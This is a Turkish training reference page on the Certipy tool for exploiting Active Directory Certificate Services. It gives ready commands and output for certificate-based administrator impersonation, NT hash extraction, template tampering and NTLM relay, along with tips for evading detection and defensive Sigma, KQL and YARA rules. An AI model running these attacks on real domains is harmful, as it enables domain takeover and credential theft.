# Certipy

> **Kategori:** [8. Active Directory Sertifika Servisleri](./README.md) · **Modül:** [Modül 11 — Araç Cephaneliği](../README.md)
> **Tanım:** Oliver Lyak (@ly4k) tarafından geliştirilen; Active Directory Sertifika Servisleri (AD CS) mimarisinde LDAP şablon keşfi, RPC/DCOM ve HTTP üzerinden sertifika talebi, PKINIT üzerinden Kerberos TGT ve NTLM hash hasadı (UnPAC-the-hash), şablon ACL manipülasyonu, NTLM relay ve ESC1'den ESC16'ya kadar tüm modern AD CS sömürü vektörlerini otomatikleştiren kapsamlı Python sömürü motoru.

---

## 1. Genel Bakış ve Amaç

Active Directory ortamlarında sertifika servislerinin sömürülmesi başlangıçta dağınık araç setleriyle (LDAP için PowerView/Certify, biletler için Rubeus, relay için ntlmrelayx) yürütülmekteydi. Bu durum operasyonel karmaşıklığa ve Linux tabanlı saldırı platformlarında (Kali, Parrot vb.) ciddi pivot zorluklarına yol açıyordu.

**`Certipy`**, bu parçalı ekosistemi tek bir çatı altında birleştiren, Python tabanlı ve Impacket kütüphanesine dayalı yeni nesil bir AD CS sömürü motorudur. Certipy yalnızca bilinen zafiyetli şablonları listelemekle kalmaz; sertifika talep etme, şablon güvenlik tanımlayıcılarını (DACL) dinamik olarak değiştirme, CA yapılandırmasını yedekleme ve bozma, NTLM kimlik doğrulamasını HTTP web kayıt uçlarına (ESC8) relay etme ve en önemlisi elde edilen X.509 sertifikası üzerinden **UnPAC-the-hash** tekniğiyle etki alanı kullanıcısının ham NT hash'ini çıkarma yeteneğine sahiptir.

### Desteklenen AD CS Zafiyet Ailesi (ESC Kapsamı)

Certipy, güvenlik literatüründeki neredeyse tüm ESC (Escalation) senaryolarını yerel olarak destekler:
- **ESC1:** `ENROLLEE_SUPPLIES_SUBJECT` açık ve `Client Authentication` EKU'su bulunan şablonlardan Domain Admin adına SAN belirterek sertifika alma.
- **ESC2:** `Any Purpose` (Herhangi Bir Amaç) veya boş EKU içeren şablonların kötüye kullanımı.
- **ESC3:** `Certificate Request Agent` (Kayıt Temsilcisi) EKU'su ile zincirleme sertifika talebi iletme.
- **ESC4:** Şablon üzerinde `WriteOwner`, `WriteDacl` veya `GenericWrite` yetkisiyle şablonu geçici olarak ESC1'e dönüştürme ve sömürü sonrası eski haline döndürme.
- **ESC6:** CA sunucusunda `EDITF_ATTRIBUTESUBJECTALTNAME2` bayrağının etkin olması durumunda herhangi bir normal şablondan SAN belirterek yönetici sertifikası alma.
- **ESC7:** CA üzerinde `ManageCA` veya `ManageCertificates` yetkisine sahip olunması (Kullanıcıyı memur atama, bekleyen isteği onaylama).
- **ESC8:** NTLM kimlik doğrulamasını HTTP üzerinden çalışan AD CS Web Kayıt Servislerine (`/certsrv/certfnsh.asp`) relay etme.
- **ESC9 / ESC10:** Güvenlik eklentisi olmayan şablonlar (`CT_FLAG_NO_SECURITY_EXTENSION`) ve zayıf sertifika eşleştirmeleri (CVE-2022-26931 / CVE-2022-26923).
- **ESC13:** Veriliş Politikaları (Issuance Policies) ve OID grup eşleştirmeleri üzerinden yetki yükseltme.

### Mimari Akış Şeması

```
┌────────────────────────────────────────────────────────────────────────┐
│                   SALDIRGAN PLATFORMU (LINUX / PYTHON)                 │
│                                                                        │
│  [ certipy find -u user@corp.local -p Pwd123 -dc-ip 10.10.10.1 ]       │
│         │                                                              │
│         ├── (1) LDAP / LDAPS Sorgusu (TCP 389/636)                     │
│         │   └── CA'lar, Şablonlar, İzinler taranır (BloodHound JSON)   │
│         │                                                              │
│         ▼                                                              │
│  [ certipy req -u user@corp.local -ca Corp-CA -template ESC1Template   │
│                -upn administrator@corp.local ]                         │
│         │                                                              │
│         ├── (2) Yerel RSA Özel Anahtarı ve CSR İnşası                  │
│         │                                                              │
│         ├── (3) MS-ICPR (DCE/RPC TCP 135) veya HTTP Web Enrollment     │
│         │   └── Hedef CA'ya Sertifika Talebi Gönderilir                │
│         │                                                              │
│         ▼                                                              │
│  [ KURUMSAL CA SUNUCUSU ] ──► İmzalar ve .PFX Formatında Teslim Eder   │
│         │                                                              │
│         ▼                                                              │
│  [ certipy auth -pfx administrator.pfx -dc-ip 10.10.10.1 ]             │
│         │                                                              │
│         ├── (4) PKINIT Protokolü ile Kerberos AS-REQ Gönderilir        │
│         │                                                              │
│         ├── (5) KDC, AS-REP içinde PAC Bilgisi Döner (U2U / PAC)       │
│         │                                                              │
│         ├── (6) UnPAC-the-hash: PAC içindeki Credential Data Çözülür   │
│         │                                                              │
│         ▼                                                              │
│  [ ÇIKTI: Administrator TGT (.ccache) + Administrator Ham NTLM Hash ]   │
└────────────────────────────────────────────────────────────────────────┘
```

### Neden Önemli? Operasyonel Değer

| Operasyonel Senaryo | Geleneksel Araçlar (Certify + Rubeus) | Certipy Yaklaşımı | Avantaj / Operasyonel Değer |
|---|---|---|---|
| **Platform Bağımsızlığı** | Windows üzerinde C# ikilileri çalıştırmayı gerektirir. | Tamamen saf Python ile Linux saldırı makinesinden doğrudan çalışır. | Uç noktaya sızmadan doğrudan ağ seviyesinden etki alanını ele geçirir. |
| **NTLM Hash Elde Etme** | Sertifikayı Kerberos biletine çevirir; ham NTLM hash vermez. | **UnPAC-the-hash** ile PAC içindeki NTLM hash'ini doğrudan deşifre eder. | Parola karmasını elde edip Pass-the-Hash ve çevrimdışı kırma olanağı sunar. |
| **BloodHound Entegrasyonu** | Sertifika verilerini manuel olarak analiz etmeyi gerektirir. | `-bloodhound` bayrağı ile doğrudan BloodHound (Custom ADCS) ZIP dosyası üretir. | Sömürü yollarını grafik üzerinde anında görselleştirir. |
| **Şablon Kurtarma (Rollback)** | ESC4 sömürüsünde şablon ayarları elle geri alınmalıdır. | `-save-old` ve `-rollback` bayrakları ile orijinal şablon ACL'ini otomatik onarır. | Operasyonel ayak izini sıfırlar, sistemde kalıcı hasar bırakmaz. |

### Alternatif Araçlarla Karşılaştırma

| Özellik | Certipy | Certify | PKINITtools | Rubeus |
|---|---|---|---|---|
| **Geliştirme Dili** | Python (Impacket) | C# (.NET) | Python | C# (.NET) |
| **Ana Kullanım Alanı** | Kapsamlı AD CS Sömürü & Yönetim | Windows Yerel Şablon Tarama | PKINIT ile Bilet Alma | Kerberos Bilet Yönetimi |
| **UnPAC-the-Hash Desteği** | 🟢 Yerleşik (`certipy auth`) | 🔴 Yok | 🟢 Var (`gettgtpkinit.py`) | 🟢 Var (`/getcredentials`) |
| **AD CS HTTP Relay (ESC8)** | 🟢 Yerleşik motor | 🔴 Yok | 🔴 Yok | 🔴 Yok |
| **BloodHound Çıktısı** | 🟢 Yerleşik (`-bloodhound`) | 🟡 Harici betik gerekir | 🔴 Yok | 🔴 Yok |
| **Şablon Manipülasyonu** | 🟢 Tam Otomatik (ESC4 edit) | 🔴 Manuel LDAP gerekir | 🔴 Yok | 🔴 Yok |

---

## 2. Temel Sözdizimi ve Parametreler (CLI Flags)

Certipy, çalıştırılmak istenen eyleme göre alt komutlara (subcommands) ayrılmıştır.

### Genel Sözdizimi

```bash
certipy <AltKomut> [Bağlantı Parametreleri] [Modül Seçenekleri]
```

### Başlıca Alt Komutlar

- **`find`:** AD CS ortamını, CA sunucularını ve şablonları listeler; zafiyetleri analiz eder.
- **`req`:** Belirtilen şablon ve CA üzerinden yeni bir sertifika talep eder.
- **`auth`:** Alınan `.pfx` sertifikasını kullanarak PKINIT ile TGT alır ve NTLM hash'ini döker.
- **`relay`:** NTLM kimlik doğrulamasını AD CS HTTP/RPC uç noktalarına ileterek sertifika üretir.
- **`template`:** Şablon yapılandırmalarını, sahipliğini ve ACL izinlerini değiştirir veya eski haline getirir.
- **`ca`:** CA sunucu ayarlarını sorgular, CA özel anahtarını yedekler veya bekleyen istekleri onaylar.
- **`forge`:** Ele geçirilmiş CA sertifikası/özel anahtarı ile sahte altın sertifika (Golden Cert) üretir.
- **`shadow`:** Hedef nesnede Shadow Credentials (`msDS-KeyCredentialLink`) enjekte eder ve TGT alır.

### Desteklenen Kritik Bayraklar ve Parametreler

| Parametre / Bayrak | Açıklama | Örnek Kullanım |
|---|---|---|
| `-u KULLANICI@DOMAIN` | Kimlik doğrulama için kullanılacak kullanıcı adı veya UPN. | `-u jdoe@corp.local` |
| `-p PAROLA` | Kullanıcı parolası (Parola yoksa NTLM hash kullanılabilir). | `-p Password123!` |
| `-hashes LM:NT` | Parola yerine NTLM karması ile Pass-the-Hash kimlik doğrulaması. | `-hashes :31d6cfe0d16ae931b73c59d7e0c089c0` |
| `-dc-ip IP` | Hedef Domain Controller'ın IP adresi (Kerberos ve LDAP için). | `-dc-ip 10.10.10.1` |
| `-target HEDEF` | Hedef CA veya Web Kayıt sunucusunun IP veya FQDN adresi. | `-target ca01.corp.local` |
| `-vulnerable` | (`find` modunda) Yalnızca bilinen yetki yükseltme açıklarına sahip şablonları filtreler. | `certipy find -vulnerable` |
| `-bloodhound` | (`find` modunda) BloodHound GUI ile uyumlu ZIP formatında veri çıktısı üretir. | `certipy find -bloodhound` |
| `-stdout` | (`find` modunda) Sonuçları dosyaya yazmak yerine doğrudan terminal ekranına basar. | `certipy find -stdout -vulnerable` |
| `-ca CANAME` | Sertifika talebinin iletileceği CA adı. | `-ca Corp-Enterprise-CA` |
| `-template ŞABLON` | İstekte bulunulacak sertifika şablonunun adı. | `-template WebAuth` |
| `-upn HEDEF_UPN` | (ESC1 modunda) Sertifikanın SAN alanına atanacak hedef ayrıcalıklı hesap. | `-upn administrator@corp.local` |
| `-pfx DOSYA.PFX` | (`auth` modunda) Kimlik doğrulamada kullanılacak PFX sertifika dosyası. | `-pfx administrator.pfx` |
| `-ldap-shell` | (`auth` modunda) PKINIT kimlik doğrulaması sonrası doğrudan interaktif LDAP kabuğu açar. | `certipy auth -pfx cert.pfx -ldap-shell` |
| `-dynamic-endpoint` | RPC dinamik portları üzerinden CA ile haberleşmeyi zorlar (TCP 135 kısıtlamalarını aşmak için). | `-dynamic-endpoint` |

---

## 3. Pratik Komut Örnekleri

### Senaryo 1: AD CS Keşfi ve BloodHound Verisi Üretme

İlk domain kullanıcısı ile etki alanındaki tüm CA ve şablonları denetlemek, zafiyetleri konsola basıp BloodHound çıktısı almak:

```bash
certipy find -u jdoe@corp.local -p 'Welcome2026!' -dc-ip 10.10.10.1 -vulnerable -bloodhound -stdout
```

**Örnek Konsol Çıktısı Analizi:**

```text
Certipy v4.8.2 - by Oliver Lyak (@ly4k)

[*] Finding certificate templates
[*] Found 34 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 11 enabled certificate templates
[*] Trying to resolve 'ca01.corp.local' at '10.10.10.1'
[*] Testing template permissions
[*] Testing enrollment rights
[*] Checking for vulnerabilities...
Certificate Authorities
  0
    CA Name                             : Corp-Enterprise-CA
    DNS Name                            : ca01.corp.local
    Certificate Subject                 : CN=Corp-Enterprise-CA, DC=corp, DC=local
    Certificate Serial Number           : 1B0000000100A1B2C3D4E5F6
    Web Enrollment                      : Enabled (http://ca01.corp.local/certsrv/)
Certificate Templates
  0
    Template Name                       : ESC1-UserTemplate
    Display Name                        : ESC1 User Template
    Certificate Authorities             : Corp-Enterprise-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollee Supplies Subject           : True
    Certificate Application Policy      : Client Authentication
    Permissions
      Enrollment Permissions
        Enrollment Rights               : CORP.LOCAL\Domain Users
    [!] Vulnerabilities
      ESC1                              : 'CORP.LOCAL\\Domain Users' can enroll, enrollee supplies subject and template allows client authentication
[*] Output saved to 20261014193000_Certipy.json
[*] Saved BloodHound data to 20261014193000_Certipy_BloodHound.zip
```

*Çıktı Yorumu:* `ESC1-UserTemplate` isimli şablonun `Domain Users` tarafından talep edilebildiği, `Enrollee Supplies Subject` bayrağının açık olduğu ve istemci doğrulamasına izin verdiği tespit edilmiştir. Aynı zamanda BloodHound ZIP arşivi üretilmiştir.

### Senaryo 2: ESC1 Sömürüsü — Sertifika Talebi ve UnPAC-the-Hash ile NT Hash Çıkarma

Zafiyetli şablon üzerinden `administrator@corp.local` kimliği taklit edilerek sertifika talep edilmesi ve ardından doğrudan NTLM hash'inin çekilmesi:

**Adım 1: Sertifikayı Talep Etme:**
```bash
certipy req -u jdoe@corp.local -p 'Welcome2026!' -ca Corp-Enterprise-CA -target ca01.corp.local -template ESC1-UserTemplate -upn administrator@corp.local
```

**Konsol Çıktısı:**
```text
Certipy v4.8.2 - by Oliver Lyak (@ly4k)

[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 143
[*] Got certificate with UPN 'administrator@corp.local'
[*] Certificate has no private key specification
[*] Saved certificate and private key to 'administrator.pfx'
```

**Adım 2: PKINIT Kimlik Doğrulaması ve Hash Hasadı:**
```bash
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.1
```

**Konsol Çıktısı:**
```text
Certipy v4.8.2 - by Oliver Lyak (@ly4k)

[*] Using principal: administrator@corp.local
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@corp.local': aad3b435b51404eeaad3b435b51404ee:2b576ac10b6a52e334f00f8f77bd1172
```

*Çıktı Yorumu:* Certipy, sertifika ile KDC'ye PKINIT isteği göndermiş, AS-REP içindeki PAC verisini (UnPAC-the-hash) ayrıştırarak Administrator kullanıcısının açık NT hash'ini (`2b576ac1...`) ve Kerberos TGT biletini (`administrator.ccache`) başarıyla elde etmiştir.

### Senaryo 3: ESC4 Sömürüsü — Şablon Güvenlik Tanımlayıcısını Düzenleme ve Temizleme

Standart kullanıcının yazma yetkisi bulunan bir şablonu geçici olarak ESC1 zafiyetli hale getirmek:

```bash
# 1. Şablonu ESC1'e dönüştür ve eski ayarları yedeğe kaydet
certipy template -u jdoe@corp.local -p 'Welcome2026!' -template VulnerableTemplate -save-old

# 2. Sertifikayı talep et
certipy req -u jdoe@corp.local -p 'Welcome2026!' -ca Corp-Enterprise-CA -target ca01.corp.local -template VulnerableTemplate -upn administrator@corp.local

# 3. Şablonu orijinal haline geri yükle (OPSEC Temizliği)
certipy template -u jdoe@corp.local -p 'Welcome2026!' -template VulnerableTemplate -configuration VulnerableTemplate.json
```

### Senaryo 4: ESC7 Sömürüsü — ManageCA Yetkisi ile Memur Atama ve İstek Onaylama

Kullanıcının CA nesnesi üzerinde `ManageCA` veya `ManageCertificates` yetkisi varsa:

```bash
# 1. Kendini 'Certificate Manager' (Memur) olarak ata
certipy ca -u jdoe@corp.local -p 'Welcome2026!' -ca Corp-Enterprise-CA -add-officer jdoe

# 2. SubCA şablonundan bir talep gönder (Talep reddedilir veya beklemeye alınır)
certipy req -u jdoe@corp.local -p 'Welcome2026!' -ca Corp-Enterprise-CA -template SubCA -upn administrator@corp.local

# 3. Bekleyen talep numarasını memur yetkisiyle onayla
certipy ca -u jdoe@corp.local -p 'Welcome2026!' -ca Corp-Enterprise-CA -issue-request 145

# 4. Onaylanan sertifikayı çek
certipy req -u jdoe@corp.local -p 'Welcome2026!' -ca Corp-Enterprise-CA -retrieve 145
```

### Senaryo 5: ESC8 Sömürüsü — NTLM Kimlik Doğrulamasını Web Enrollment'a Relay Etme

Web Enrollment servisi açık olan bir CA sunucusuna coerced authentication (PetitPotam / Coercer) ile yönlendirilen DC makine hesabını relay etmek:

```bash
# Terminal 1: Certipy Relay dinleyicisini başlat
certipy relay -target http://ca01.corp.local/certsrv/certfnsh.asp -template DomainController -ca Corp-Enterprise-CA

# Terminal 2: DC'yi saldırgan makineye NTLM ile tetikle (PetitPotam)
python3 petitpotam.py 10.10.10.100 10.10.10.1
```

Relay motoru, DC'nin makine kimliğiyle gelen isteği web servisine ileterek etki alanı denetleyicisi adına geçerli bir makine sertifikası (`DC01$.pfx`) üretir. Bu sertifika ile DCSync saldırısı gerçekleştirilir.

---

## 4. Karşılaşılan Hatalar ve Çözümleri (Troubleshooting)

| Hata Mesajı / Kod | Temel Neden | Kesin Çözüm Adımı |
|---|---|---|
| `KDC_ERR_CLIENT_NAME_MISMATCH (0x4B)` | PKINIT sırasında sunulan sertifikadaki UPN alanı (`administrator@corp.local`) ile hedef DC'nin beklediği nesne kimliği uyuşmamaktadır. | Hedef kullanıcının UPN ve sAMAccountName değerleri LDAP üzerinden doğrulanmalıdır. Alternatif olarak etki alanı NetBIOS adıyla veya FQDN ile talep yapılmalıdır. |
| `CERTSRV_E_BAD_REQUESTSTATUS (0x80094001)` | Hedef şablon "Yönetici Onayı" (`Requires Manager Approval`) gerektirmektedir. İstek onay beklemektedir. | İstek ID numarası kaydedilmeli; eğer ESC7 yetkisi varsa `certipy ca -issue-request <ID>` ile onaylanmalı, yoksa onay gerektirmeyen başka bir şablon seçilmelidir. |
| `Got error while trying to request certificate: code: 0x80070005 - E_ACCESSDENIED` | CA sunucusunda DCOM/RPC izinleri eksiktir veya hedef şablonda kullanıcının `Enroll` hakkı bulunmamaktadır. | Şablon izinleri `certipy find` ile tekrar kontrol edilmeli; RPC kısıtlıysa web enrollment (HTTP) servisi denenmelidir. |
| `KDC_ERR_PADATA_TYPE_NOSUPP (0x10)` | Domain Controller üzerinde PKINIT için geçerli bir KDC sertifikası yüklü değildir. | DC PKINIT desteklemiyorsa, elde edilen `.pfx` sertifikası LDAPS (Pass-the-Cert) üzerinden Schannel oturumu açmak veya Shadow Credentials enjekte etmek için kullanılmalıdır. |
| `Relay failed: HTTP 401 Unauthorized / EPA Enforced` | AD CS Web Enrollment uç noktasında Kimlik Doğrulama için Genişletilmiş Koruma (EPA) ve Kanal Bağlama (Channel Binding) etkindir. | NTLM relay saldırısı (ESC8) bu hedefte uygulanamaz. RPC tabanlı şablon sömürülerine (ESC1-ESC4) veya Shadow Credentials tekniklerine yönelinmelidir. |
| `Connection reset by peer on port 135` | CA sunucusu ile saldırgan makine arasındaki RPC iletişimi kurumsal güvenlik duvarı veya IPS tarafından kesilmektedir. | `-dynamic-endpoint` bayrağı kullanılarak doğrudan RPC dinamik portlarına bağlanılmalı veya pivot tüneli (Chisel/Socks5) kurulmalıdır. |

---

## 5. OPSEC ve Karşı Tespit (IOC)

```
┌────────────────────────────────────────────────────────────────────────┐
│                        GÜRÜLTÜ VE İZ SEVİYESİ                          │
│                                                                        │
│  [ Ağ Trafiği ]      : 🟡 ORTA (LDAP/RPC paketleri, HTTP relay)        │
│  [ CA Veritabanı ]   : 🔴 YÜKSEK (Tüm başarılı/başarısız istekler)     │
│  [ Kerberos / DC ]   : 🔴 YÜKSEK (Event 4768 PKINIT Pre-Auth Olayları) │
│  [ LDAP Nesne İzi ]  : 🔴 YÜKSEK (ESC4 şablon değişiklikleri Event 5136)│
└────────────────────────────────────────────────────────────────────────┘
```

### 5.1 Bırakılan İzler (Artifacts & Telemetry)

1. **CA Olay Günlükleri (Microsoft-Windows-CertificationAuthority):**
   - **Event ID 4886 / 4887:** Sertifika talebi alındı ve yayımlandı. `Requester` alanı `CORP\jdoe` iken, `Subject Alternative Name` alanında `administrator@corp.local` yer alması net bir alarm kaynağıdır.
   - **Event ID 4898:** Bir sertifika şablonu yüklendi veya güncellendi (ESC4 modifikasyonlarının tespiti).
2. **Domain Controller Olay Günlükleri:**
   - **Event ID 4768:** Kerberos TGT talebi. `Pre-Authentication Type: 16` (PKINIT). Sertifikanın seri numarası ve veren makine loglara geçer.
   - **Event ID 5136 (Directory Service Changes):** `CN=Certificate Templates` altındaki nesnelerin `nTSecurityDescriptor` veya `msPKI-Certificate-Name-Flag` özniteliklerinin değiştirilmesi.
3. **Ağ İmzaları:**
   - `certsrv/certfnsh.asp` adresine olağandışı User-Agent veya Python-urllib başlıklarıyla gelen yoğun POST istekleri.

### 5.2 Ağ ve EDR İmzaları

- **Impacket DCERPC İmzaları:** Certipy, Impacket DCERPC kütüphanesini kullanır; bu kütüphanenin RPC paket bağlama (bind) başlıklarındaki varsayılan bayraklar kurumsal NIDS/NDR sistemleri (Snort, Suricata, Zeek) tarafından imzalanmıştır.
- **UnPAC-the-hash Trafiği:** KDC'ye gönderilen olağandışı Kerberos AS-REQ ve AS-REP paket dizisi.

### 5.3 MITRE ATT&CK Eşleştirmesi

| Teknik ID | Teknik Adı | Araç İçindeki Kullanım |
|---|---|---|
| **T1649** | Steal or Forge Authentication Certificates | Zafiyetli şablonlardan ve CA servislerinden yetkisiz X.509 sertifikası üretimi. |
| **T1558.003** | Kerberos Ticket Granting Tickets | Elde edilen sertifika ile PKINIT üzerinden TGT biletinin alınması. |
| **T1557.001** | LLMNR/NBT-NS Poisoning and SMB Relay | Coerced NTLM kimlik doğrulamasının AD CS Web Enrollment'a relay edilmesi (ESC8). |
| **T1484.001** | Domain Policy Modification: Certificate Templates | Şablon izinlerinin ve bayraklarının manipüle edilmesi (ESC4). |

### 5.4 OPSEC Önerileri

| Risk | Önlem / Güvenli Operasyon Pratiği |
|---|---|
| **CA Veritabanında Kalıcı Sertifika** | Sömürü sonrası üretilen sertifikanın Seri Numarası ve Request ID'si not edilmeli, operasyon bitiminde iptal edilmelidir. |
| **ESC4 Şablon Bozulması** | Şablon ayarları değiştirilirken mutlaka `-save-old` bayrağı kullanılmalı ve sömürü biter bitmez `-configuration` ile eski haline döndürülmelidir. |
| **UnPAC-the-Hash Gürültüsü** | TGT almak yeterliyse ve NT hash şart değilse yalnızca bilet kullanılmalı; gereksiz yere KDC'ye ek PAC çözümleme çağrıları yaptırılmamalıdır. |
| **Web Relay Tespiti** | HTTP relay sırasında hedef sunucuya özel `User-Agent` tanımlanmalı ve kurumsal tarayıcı başlıkları taklit edilmelidir. |

### 5.5 Savunma Karşılığı: Tespit Kuralları

#### Sigma Kuralı: AD CS Şablon Modifikasyonu ve Certipy ESC4 Tespiti

```yaml
title: Active Directory Certificate Template Modification (ESC4)
id: d8214a91-4912-4c20-a912-581938bfe812
status: experimental
description: Detects modifications to certificate template attributes indicative of ESC4 manipulation.
author: Modul 11 Security Research
logsource:
  product: windows
  service: security
detection:
  selection:
    EventID: 5136
    ObjectDN|contains: 'CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration'
    AttributeLDAPDisplayName:
      - 'msPKI-Certificate-Name-Flag'
      - 'nTSecurityDescriptor'
      - 'pKIExtendedKeyUsage'
  condition: selection
falsepositives:
  - Legitimate PKI administrative maintenance by Domain Admins
level: high
tags:
  - attack.credential_access
  - attack.t1484.001
```

#### Microsoft Sentinel KQL Sorgusu: UnPAC-the-Hash ve Anormal PKINIT Logini

```kql
// Kısa süre içinde PKINIT (Pre-Auth 16) ile oturum açıp ardından NTLM hash ile yeni süreç başlatan oturumlar
SecurityEvent
| where TimeGenerated > ago(1h)
| where EventID == 4768 and PreAuthType == 16
| project TimeGenerated, AccountName = TargetUserName, CertIssuer = CertificateIssuerName, CertSerial = CertificateSerialNumber, IpAddress
| join kind=inner (
    SecurityEvent
    | where EventID == 4624 and LogonType == 3 and AuthenticationPackageName == "NTLM"
    | project NtlmTime = TimeGenerated, TargetUserName, WorkstationName, IpAddress
) on $left.AccountName == $right.TargetUserName
| where NtlmTime between (TimeGenerated .. (TimeGenerated + 10m))
| project TimeGenerated, AccountName, CertIssuer, CertSerial, IpAddress, NtlmTime
```

#### YARA Kuralı: Certipy Python Modülü ve UnPAC-the-Hash İmza Tespiti

```yara
rule PostExploit_Certipy_Framework {
    meta:
        description = "Detects Certipy AD CS exploitation engine scripts and internal methods"
        author = "Active Directory Red Team Module 11"
        date = "2026-10-14"
        severity = "Critical"
    strings:
        $s1 = "Oliver Lyak (@ly4k)" ascii
        $s2 = "certipy.commands" ascii
        $s3 = "UnPAC-the-hash" ascii
        $s4 = "EDITF_ATTRIBUTESUBJECTALTNAME2" ascii
        $s5 = "ENROLLEE_SUPPLIES_SUBJECT" ascii
        $s6 = "certipy auth -pfx" ascii
    condition:
        2 of ($s1, $s2, $s3) or (all of ($s4, $s5, $s6))
}
```

---

## 6. En Çok Kullanılan Komutlar ve Açıklamaları (Cheat Sheet)

### Komut 1: Zafiyetli Şablonları Tarama ve BloodHound Verisi Toplama
```bash
certipy find -u user@corp.local -p 'Pass123' -dc-ip 10.10.10.1 -vulnerable -bloodhound
```
- **Ne Yapar?** Tüm AD CS ortamını tarar, zafiyetli şablonları tespit eder ve BloodHound için ZIP arşivi üretir.
- **Ne Zaman Kullanılır?** İlk erişim aşamasında etki alanındaki tüm sertifika eskalasyon yollarını haritalamak için.
- **Parametreler:** `-vulnerable`: Sadece zafiyetlileri gösterir, `-bloodhound`: Grafik verisi çıkarır.

### Komut 2: ESC1 Sömürüsü ile Domain Admin Sertifikası Alma
```bash
certipy req -u user@corp.local -p 'Pass123' -ca Corp-CA -target ca01.corp.local -template ESC1Template -upn administrator@corp.local
```
- **Ne Yapar?** Belirtilen şablondan Administrator UPN kimliğiyle X.509 sertifikası talep eder ve `administrator.pfx` olarak kaydeder.
- **Ne Zaman Kullanılır?** `ENROLLEE_SUPPLIES_SUBJECT` açık bir şablon sömürülürken.
- **Parametreler:** `-template`: Zafiyetli şablon, `-upn`: Kimliği taklit edilecek hesap.

### Komut 3: Sertifikadan TGT ve Ham NT Hash Elde Etme (UnPAC-the-hash)
```bash
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.1
```
- **Ne Yapar?** PFX sertifikasını kullanarak PKINIT ile Kerberos TGT alır ve kullanıcının NT hash'ini ekrana döker.
- **Ne Zaman Kullanılır?** Alınan sertifikayı etki alanı yöneticisi oturumuna ve parola karmasına dönüştürmek için.
- **Parametreler:** `-pfx`: Alınan sertifika dosyası, `-dc-ip`: KDC etki alanı denetleyicisi.

### Komut 4: Sonuçları Doğrudan Terminalde Gösterme (Dosya Yazmadan)
```bash
certipy find -u user@corp.local -p 'Pass123' -dc-ip 10.10.10.1 -stdout -vulnerable
```
- **Ne Yapar?** Tarama sonuçlarını diske `.json` veya `.txt` yazmadan doğrudan ekrana basar.
- **Ne Zaman Kullanılır?** Dosya sistemi izlenen sistemlerde disk I/O izi bırakmamak için.
- **Parametreler:** `-stdout`: Standart çıktıya yönlendirir.

### Komut 5: ESC4 Şablon Haklarını Manipüle Etme (Yedeklemeli)
```bash
certipy template -u user@corp.local -p 'Pass123' -template TargetTemplate -save-old
```
- **Ne Yapar?** Şablonu ESC1 haline getirir ve orijinal yapılandırmayı JSON dosyasına yedekler.
- **Ne Zaman Kullanılır?** Şablon üzerinde yazma hakkı (`GenericWrite` / `WriteDacl`) olduğunda.
- **Parametreler:** `-save-old`: Orijinal ayarları daha sonra geri yüklemek üzere kaydeder.

### Komut 6: Şablonu Orijinal Ayarlarına Döndürme (Rollback)
```bash
certipy template -u user@corp.local -p 'Pass123' -template TargetTemplate -configuration TargetTemplate.json
```
- **Ne Yapar?** Daha önce değiştirilen şablonun ACL ve bayraklarını orijinal haline geri yükler.
- **Ne Zaman Kullanılır?** ESC4 sömürüsü tamamlandıktan hemen sonra izleri temizlemek için.
- **Parametreler:** `-configuration`: Yedek JSON dosyasını uygular.

### Komut 7: NTLM Kimlik Doğrulamasını Web Enrollment'a Relay Etme (ESC8)
```bash
certipy relay -target http://ca01.corp.local/certsrv/certfnsh.asp -template DomainController -ca Corp-CA
```
- **Ne Yapar?** Gelen NTLM kimlik doğrulamasını AD CS web servisine relay ederek hedef adına sertifika üretir.
- **Ne Zaman Kullanılır?** PetitPotam veya PrinterBug ile etki alanı denetleyicisi tetiklendiğinde.
- **Parametreler:** `-target`: Web kayıt URL'si, `-template`: Talep edilecek makine şablonu.

### Komut 8: Pass-the-Hash ile Sertifika Talep Etme
```bash
certipy req -u admin@corp.local -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 -ca Corp-CA -target ca01.corp.local -template User
```
- **Ne Yapar?** Açık parola yerine NTLM hash'i kullanarak sertifika talebi iletir.
- **Ne Zaman Kullanılır?** Yalnızca NT hash ele geçirildiğinde ve parola bilinmediğinde.
- **Parametreler:** `-hashes`: LM:NT parola karması formatı.

### Komut 9: CA Yönetici Yetkisiyle Bekleyen İsteği Onaylama (ESC7)
```bash
certipy ca -u user@corp.local -p 'Pass123' -ca Corp-CA -issue-request 142
```
- **Ne Yapar?** Yönetici onayında bekleyen bir sertifika talebini `ManageCertificates` yetkisiyle onaylar.
- **Ne Zaman Kullanılır?** Şablonda yönetici onayı şartı bulunduğunda.
- **Parametreler:** `-issue-request`: Onaylanacak talep ID'si.

### Komut 10: PKINIT ile İnteraktif LDAP Shell Açma
```bash
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.1 -ldap-shell
```
- **Ne Yapar?** Sertifika ile kimlik doğrulayıp doğrudan yetkili bir interaktif LDAP komut satırı açar.
- **Ne Zaman Kullanılır?** Parola sıfırlama, grup üyeliği ekleme veya kullanıcı oluşturma gibi işlemleri hızla yapmak için.
- **Parametreler:** `-ldap-shell`: İnteraktif LDAP konsolunu başlatır.

---

## Kaynaklar

- **Resmi GitHub Reposu:** [ly4k / Certipy](https://github.com/ly4k/Certipy)
- **Oliver Lyak Araştırma Blogu:** [Certipy 4.0: ESC9 & ESC10](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-relaying-bugs-and-more-part-1-1b9134a4e12e)
- **SpecterOps "Certified Pre-Owned" Makalesi:** [Abusing Active Directory Certificate Services](https://posts.specterops.io/certified-pre-owned-d95910965cd2)
- **MITRE ATT&CK Referansı:** [T1649 - Steal or Forge Authentication Certificates](https://attack.mitre.org/techniques/T1649/)

---

> **Önceki:** [← Certify](./Certify.md) · **Sonraki:** [ForgeCert →](./ForgeCert.md)
